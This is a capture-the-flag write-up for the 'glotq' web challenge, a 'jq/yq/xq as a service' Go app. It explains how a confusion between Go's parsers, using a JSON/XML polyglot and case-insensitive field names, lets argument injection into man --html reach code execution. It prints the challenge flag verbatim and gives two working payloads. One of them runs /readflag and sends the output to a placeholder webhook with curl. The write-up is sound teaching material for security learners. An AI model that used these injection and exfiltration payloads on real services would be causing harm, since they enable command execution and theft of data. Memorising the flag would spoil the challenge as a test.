# web / glotq

- **Repo path:** `2026/web/glotq`
- **Category:** web
- **Difficulty (estimate):** Medium
- **Points:** not listed
- **FLAG:** `lactf{PoLY9LOt_TH3_Fl49}`
  - Source: verbatim from `2026/web/glotq/app/flag.txt`.
- **needs_docker:** yes. Service files: `2026/web/glotq/app/Dockerfile` and `2026/web/glotq/app/docker-compose.yaml`. Go app (`main.go`, `handlers.go`, `middleware.go`); flag read via setuid `readflag` binary.

## Technique / attack name
Two chained bugs:
1. **Go parser confusion** — a security middleware inspects the request one way, but the handler re-parses it another way (JSON/XML/YAML polyglot), letting a forbidden field slip past the allowlist. (Ref: Trail of Bits "Unexpected security footguns in Go's parsers".)
2. **Argument injection into `man`** — the app runs `man` with attacker-controlled args; `man --html=<cmd>` (a.k.a. `-H`) executes `<cmd>` as a shell command to render the page. (Ref: RyotaK "Pwning Claude Code" `man --html` trick.)

## How the challenge works
"jq / yq / xq as a service." Endpoints `/yaml`, `/xml`, `/json` accept a document specifying a `command` and `args`. A middleware validates the parsed request to restrict the command, but the actual executor parses the body with a different (more permissive) Go parser, so a polyglot body passes validation as a safe command while the executor sees `man` with injected args.

## Step-by-step solution (from committed `solve.py` / `solve.txt`)
- **Simple path (`solve.txt`, `/yaml`):** POST JSON where the validated `command` differs from the executed one, injecting `man` with `-H/readflag` so `man` renders `jq`'s page by running `/readflag`:
  ```
  POST /yaml  content-type: application/json
  {"command":"man","args":["-H/readflag","jq"],"Args":["jq"]}
  ```
  (Go struct field-name case-insensitivity: `args` vs `Args` disagreement between validator and executor.)
- **Documented path (`solve.py`, `/xml`):** build a JSON body containing a `random` string that is itself a valid XML doc (JSON–XML polyglot). The XML parser used by the executor sees `<command>man</command>` with `<arg>--html=<shell command>` while the JSON validator sees a benign `{"command":"man","args":["jq"]}`. The `--html` command exfiltrates the flag:
  ```
  --html=FLAG=$(/readflag); curl -X POST <webhook> -d flag=$FLAG
  ```
- Result: `/readflag` prints the flag; read it from `man` HTML output or the webhook.

## Source files handed out
- `2026/web/glotq/glotq.zip` (packaged app source; per challenge.yaml `provide: glotq.zip`)
- In-repo app source: `2026/web/glotq/app/{main.go,handlers.go,middleware.go,go.mod,go.sum,Dockerfile,docker-compose.yaml}`, plus `app/readflag/readflag.c` and `app/flag.txt`.
- (`solve.py`, `solve.txt` in repo)
